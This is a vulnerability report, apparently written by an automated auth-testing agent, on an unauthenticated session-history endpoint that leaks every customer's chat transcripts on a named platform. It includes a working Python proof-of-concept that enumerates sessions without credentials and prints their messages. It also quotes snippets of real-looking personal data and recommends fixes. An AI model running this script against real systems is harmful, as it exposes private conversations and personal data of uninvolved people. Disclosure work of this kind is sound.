# vuln-0003 — Unauthenticated session history BOLA exposes all customer chat transcripts

**Severity:** HIGH (CVSS 7.5)  
**Target:** https://chiefaiofficer.id/v1/sessions/{session_id}/history  
**Method:** GET  
**CWE:** CWE-639  
**CVSS Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`  
**Confidence:** high  
**Fix Effort:** low  
**Finding Class:** dynamic  
**Filed by:** Auth Validation Agent @ 2026-10-28 02:09:55 UTC
**Proxy Evidence (exchange IDs):** 426, 459, 461

## Deskripsi

`GET https://chiefaiofficer.id/v1/sessions/{session_id}/history` requires no authentication and returns the complete chat transcript of any customer conversation — including end-user messages, assistant replies, attachment filenames, and run identifiers — for any session UUID. Session UUIDs are trivially enumerable via the unauthenticated `GET /v1/agents/{agent_id}/sessions`, so an anonymous attacker can read every conversation on the platform.

## Dampak

Unauthenticated disclosure of all customer conversation content platform-wide: job-applicant CVs and personal details, customer names, WhatsApp conversation content, agent internal reasoning, and tool-call records. This is a cross-tenant privacy breach of both the tenants (businesses) and their end users (applicants/customers), with regulatory exposure (personal data processed without any access control).

## Analisis Teknis

Same root cause as the `/v1/agents` leak: the FastAPI Managed Agent Platform is mounted unauthenticated on the apex under `/v1/*`. The `/v1/sessions/{session_id}/history` route performs only an existence lookup (404 for unknown ids) with no ownership or authentication check (CWE-639: the session_id is the only capability, and it is disclosed by sibling routes). Response includes full message rows: role, content, tool_name/tool_args/tool_result, run_id, timestamps. Session UUIDs are enumerable via the unauthenticated agent-sessions listing, so no brute force is required. This is a straightforward unauthenticated BOLA.

## Proof of Concept — Langkah

1. Obtain a session UUID unauthenticated: GET https://chiefaiofficer.id/v1/agents/{agent_id}/sessions (agent_id from the /v1/agents leak) → session ids.
2. GET https://chiefaiofficer.id/v1/sessions/{session_id}/history with no credentials → 200 and the full message transcript (role, content, tool_name, tool_args, tool_result, timestamps).
3. Control: GET with a random UUID → 404, proving the object exists check runs but no authorization does.

## Proof of Concept — Script


```python
import requests

BASE = "https://chiefaiofficer.id"

agent_id = requests.get(f"{BASE}/v1/agents", timeout=15).json()["items"][0]["id"]
sessions = requests.get(
    f"{BASE}/v1/agents/{agent_id}/sessions?limit=2", timeout=15
).json()["items"]
sid = sessions[0]["id"]
print("session:", sid, "external_user:", sessions[0]["external_user_id"])

hist = requests.get(f"{BASE}/v1/sessions/{sid}/history", timeout=15)  # no auth
print("history status:", hist.status_code)
for m in hist.json()["messages"]:
    print(m["role"], ":", m["content"][:80])

# control: random session -> 404
import uuid
print("control:",
      requests.get(
          f"{BASE}/v1/sessions/{uuid.uuid4()}/history", timeout=15
      ).status_code)  # -> 404
```

## Bukti

Exchange 459/422: bare GET to /v1/sessions/535ec935-df4b-4578-9bab-2aa6aac26f70/history → 200, 4,792 bytes, full message transcript with customer names ("Kak Bagas"), CV filenames ("CV Rizky.pdf"), and tool call metadata. Exchange 461/424: random UUID → 404 (existence check present, authorization not). Session UUID sourced unauthenticated from exchange 426/388.

## Asumsi

Session UUIDs are obtainable without credentials via the same apex mount (GET /v1/agents/{agent_id}/sessions), so no prior compromise is needed.

## Counterevidence

Looked for authorization on the route: no header, cookie, or query parameter is required — a bare GET returns the transcript (exchange 459/422). The OpenAPI spec lists no security scheme at all for this app. The 404 control for a random UUID shows the endpoint does validate session existence, so the lack of a 401/403 is not a routing artifact — it is genuinely unauthenticated. No rate limiting observed.

## Kondisi Perubahan Severity

If transcripts were found to contain payment data or credentials, severity would rise further; if the only exposed sessions were synthetic QA fixtures, real-world impact would drop — but the tested session contains genuine customer PII (applicant CV conversation), so this is confirmed.

## Rekomendasi Perbaikan

Add an authorization layer to session routes: require a valid API key and verify the session belongs to a tenant the caller owns before returning history. Remove the unauthenticated `/v1/*` apex mount (same root cause as the /v1/agents leak). Treat session UUIDs as bearer-grade secrets is not sufficient — enforce server-side object ownership checks (IDOR/BOLA middleware) on every `/v1/sessions/*` and `/v1/agents/*/sessions` route.
